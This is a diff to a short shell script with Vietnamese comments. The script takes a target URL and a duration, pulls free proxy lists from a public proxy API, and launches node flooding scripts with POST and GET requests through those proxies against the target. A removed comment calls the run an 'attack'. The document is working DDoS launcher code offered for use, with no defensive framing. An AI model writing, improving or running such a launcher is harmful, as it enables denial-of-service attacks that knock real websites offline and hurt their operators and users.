@@ -4,18 +4,16 @@
 URL=$1
 TIME=$2
 
+# Xoá proxy cũ, tải mới
 > live.txt
 for t in http https; do
-  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$t" >> live.txt
-done
+  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$t"
+done | sort -u > live.txt
 
-sort -u live.txt -o live.txt
-
-# Start Node scripts
+# Chạy tiến trình node (POST, GET + fixed.js)
 for m in POST GET; do
-  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true || true &
-  node fixed.js $URL $TIME 1 1 hihi.txt --verify true || true &
+  node h1.js $m "$URL" live.txt "$TIME" 999 10 randomstring=true || true &
+  node fixed.js "$URL" "$TIME" 1 1 hihi.txt --verify true || true &
 done
+
 wait
-# Đợi đúng thời gian attack trước khi exit
-sleep $TIME
